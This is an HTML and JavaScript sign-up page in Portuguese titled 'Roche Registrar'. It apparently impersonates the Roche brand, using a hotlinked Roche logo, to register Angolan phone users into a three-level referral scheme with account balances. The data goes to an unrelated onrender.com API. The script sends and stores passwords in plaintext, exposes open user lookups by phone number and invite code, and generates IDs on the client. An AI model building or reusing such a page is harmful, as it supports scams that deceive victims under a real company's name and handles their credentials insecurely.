<!DOCTYPE html>
<html lang="pt">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roche Registrar</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            list-style: none;
            text-decoration: none;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(180deg, #ffae00, rgba(255, 215, 0, 0));
            font-family: Arial, sans-serif;
            min-height: 100vh;
            color: #333;
            margin: 0;
        }

        .login_logo {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 50px 0 30px;
        }

        .login_logo img {
            width: 180px;
            height: auto;
        }

        .login_form {
            width: 90%;
            margin: 0 auto;
            padding: 20px;
            border-radius: 10px;
        }

        .input-container {
            margin-bottom: 20px;
        }

        .input-control {
            width: 100%;
            height: 50px;
            border: 1px solid #ff7e00;
            border-radius: 10px;
            position: relative;
            background: rgb(255, 255, 240);
            overflow: hidden;
        }

        .input-control i {
            position: absolute;
            left: 15px;
            top: 70%;
            transform: translateY(-50%);
            color: #ff7e00;
            font-size: 18px;
        }

        .inputfield {
            width: 100%;
            height: 100%;
            border: none;
            background: transparent;
            padding: 0 15px 0 45px;
            font-size: 16px;
            color: #333;
        }

        .inputfield:focus {
            outline: none;
        }

        .center {
            text-align: center;
            margin-top: 20px;
        }

        .space-20 {
            height: 20px;
        }

        .btn_submit_my {
            display: block;
            width: 100%;
            height: 50px;
            line-height: 50px;
            background: linear-gradient(90deg, #ff7e00, #ff7e00);
            border-radius: 25px;
            text-align: center;
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-decoration: none;
            margin: 0 auto;
            box-shadow: 0 5px 15px rgba(255, 126, 0, 0.3);
            cursor: pointer;
            transition: all 0.3s;
            border: none;
        }

        .btn_submit_my:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 126, 0, 0.4);
        }

        .login_laa {
            display: block;
            width: 100%;
            height: 50px;
            line-height: 50px;
            background: rgba(255, 126, 0, 0.1);
            border: 1px solid #ff7e00;
            border-radius: 25px;
            text-align: center;
            color: #ff7e00;
            font-size: 18px;
            font-weight: bold;
            text-decoration: none;
            margin: 15px auto 0;
            transition: all 0.3s;
        }

        .login_laa:hover {
            background: rgba(255, 126, 0, 0.2);
        }

                .toast {
    visibility: hidden;
    min-width: 250px;
    background-color: #333;
    color: #fff;
    text-align: center;
    border-radius: 2px;
    padding: 16px;
    position: fixed;
    z-index: 1;
    left: 50%;
    bottom: 30px;
    font-size: 17px;
    transform: translateX(-50%);
}


        .toast.show {
            visibility: visible;
            animation: fadein 0.5s, fadeout 0.5s 2.5s;
        }

        .toast.error {
            background-color: #ff4444;
        }

        .toast.success {
            background-color: #00C851;
        }

        @keyframes fadein {
            from {bottom: 0; opacity: 0;}
            to {bottom: 30px; opacity: 1;}
        }

        @keyframes fadeout {
            from {bottom: 30px; opacity: 1;}
            to {bottom: 0; opacity: 0;}
        }

        .icon-mobile::after {
            content: "+244";
        }

        #mobile {
            padding-left: 75px;
        }
    </style>
</head>

<body>
    <div class="login_logo">
        <img src="https://cdn.cookielaw.org/logos/d83b6e8f-2787-46e5-b85f-ad52b3a0acb6/3b086a3a-3db1-485d-85e9-83b103a2dc33/4206ae1e-38f5-403f-a211-c14b7a71677e/Roche_Logo_800px_Blue_RGB_Roche_Logo_RGB_(1).png" />
    </div>
    <div class="login_form">
        <form id="registerForm">
            <div class="input-container">
                <div class="input-control">
                    <i class="icon iconfont icon-mobile"></i>
                    <input class="inputfield" id="telefone" type="text" name="telefone" minlength="9" maxlength="9"
                        placeholder="Telefone (9 dígitos)" required>
                </div>
            </div>
            <div class="input-container">
                <div class="input-control">
                    <i class="icon iconfont icon-mima"></i>
                    <input class="inputfield" type="password" id="senha" name="senha" minlength="6" maxlength="16"
                        placeholder="Senha (mínimo 6 caracteres)" required>
                </div>
            </div>
            <div class="input-container">
                <div class="input-control">
                    <i class="icon iconfont icon-mima"></i>
                    <input class="inputfield" type="password" id="confirmar_senha" name="confirmar_senha" minlength="6" maxlength="16"
                        placeholder="Confirmar Senha" required>
                </div>
            </div>
            <div class="input-container">
                <div class="input-control">
                    <i class="icon iconfont icon-tuijianren"></i>
                    <input class="inputfield" type="text" id="codigo_convite_referido" name="codigo_convite_referido"
                        placeholder="Código de convite (opcional)">
                </div>
            </div>
            <div class="center">
                <div class="space-20"></div>
                <button type="submit" class="btn_submit_my">Registrar</button>
            </div>
        </form>
        <a href="index.html" class="login_laa">Já tenho uma conta</a>
    </div>

    <div id="toast" class="toast"></div>

    <script>
    function showToast(message, type) {
        const toast = document.getElementById('toast');
        if (toast) {
            toast.textContent = message;
            toast.className = 'toast show ' + type;

            setTimeout(() => {
                toast.className = toast.className.replace('show', '');
            }, 3000);
        }
    }

    // Função para sanitizar inputs
    function sanitizeInput(input) {
        return input.replace(/[<>]/g, '').replace(/javascript:/gi, '').trim();
    }

    // Verificar se telefone já existe
    async function checkPhoneExists(telefone) {
        try {
            const response = await fetch(`https://api-wped.onrender.com/user?telefone=${telefone}`);
            if (!response.ok) return false;
            const data = await response.json();
            return data.length > 0;
        } catch (error) {
            console.error('Erro ao verificar telefone:', error);
            return false;
        }
    }

    // Gerar ID único
    function generateUniqueId() {
        return Math.random().toString(36).substr(2, 9);
    }

    // Gerar código de convite
    function generateInviteCode() {
        return Math.random().toString(36).substr(2, 8).toUpperCase();
    }

    // Formatar telefone (9 dígitos)
    function formatPhoneNumber(phone) {
        return phone.replace(/\D/g, '').slice(0, 9);
    }

    // Obter código de convite da URL
    function getInviteCodeFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('ref') || '';
    }

    // Registrar usuário
    async function registerUser(event) {
        event.preventDefault();

        const telefone = formatPhoneNumber(document.getElementById('telefone').value);
        const senha = document.getElementById('senha').value;
        const confirmar_senha = document.getElementById('confirmar_senha').value;
        let codigo_convite_referido = sanitizeInput(document.getElementById('codigo_convite_referido').value);

        // Validações
        if (!telefone || telefone.length !== 9 || !telefone.startsWith('9')) {
            showToast('Número de telefone inválido. Deve ter 9 dígitos começando com 9.', 'error');
            return;
        }

        if (senha.length < 6) {
            showToast('A senha deve ter pelo menos 6 caracteres.', 'error');
            return;
        }

        if (senha !== confirmar_senha) {
            showToast('As senhas não coincidem.', 'error');
            return;
        }

        // Se não tiver código de convite, verifica na URL
        if (!codigo_convite_referido) {
            codigo_convite_referido = getInviteCodeFromURL();
        }

        // Verificar se telefone já existe
        const phoneExists = await checkPhoneExists(telefone);
        if (phoneExists) {
            showToast('Este número de telefone já está registrado.', 'error');
            return;
        }

        // Obter níveis 2 e 3
        let nivel2 = '';
        let nivel3 = '';

        if (codigo_convite_referido) {
            try {
                // Buscar quem convidou (nível 1)
                const resNivel1 = await fetch(`https://api-wped.onrender.com/user?codigo_convite=${codigo_convite_referido}`);
                const nivel1User = await resNivel1.json();

                if (nivel1User.length > 0) {
                    nivel2 = nivel1User[0].codigo_convite_referido || '';

                    if (nivel2) {
                        // Buscar quem convidou o nível 1 (nível 2)
                        const resNivel2 = await fetch(`https://api-wped.onrender.com/user?codigo_convite=${nivel2}`);
                        const nivel2User = await resNivel2.json();

                        if (nivel2User.length > 0) {
                            nivel3 = nivel2User[0].codigo_convite_referido || '';
                        }
                    }
                }
            } catch (error) {
                console.error('Erro ao buscar níveis de convite:', error);
            }
        }

        // Criar objeto com dados do usuário
        const userData = {
            id: generateUniqueId(),
            telefone,
            senha,
            codigo_convite: generateInviteCode(),
            codigo_convite_referido: codigo_convite_referido || '',
            nivel2: nivel2,
            nivel3: nivel3,
            saldo: 0
        };

        // Enviar para API
        try {
            const response = await fetch('https://api-wped.onrender.com/user', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(userData)
            });

            if (response.ok) {
                showToast('Registro realizado com sucesso!', 'success');
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 2000);
            } else {
                showToast('Erro ao registrar. Tente novamente.', 'error');
            }
        } catch (error) {
            console.error('Erro:', error);
            showToast('Erro de conexão. Tente novamente.', 'error');
        }
    }

    // Configurar eventos quando o DOM carregar
    document.addEventListener('DOMContentLoaded', function () {
        const telefoneInput = document.getElementById('telefone');
        if (telefoneInput) {
            telefoneInput.addEventListener('input', function () {
                this.value = formatPhoneNumber(this.value);
            });
        }

        const inviteCode = getInviteCodeFromURL();
        if (inviteCode) {
            document.getElementById('codigo_convite_referido').value = inviteCode;
        }

        document.getElementById('registerForm').addEventListener('submit', registerUser);
    });
</script>
<body>
<html>
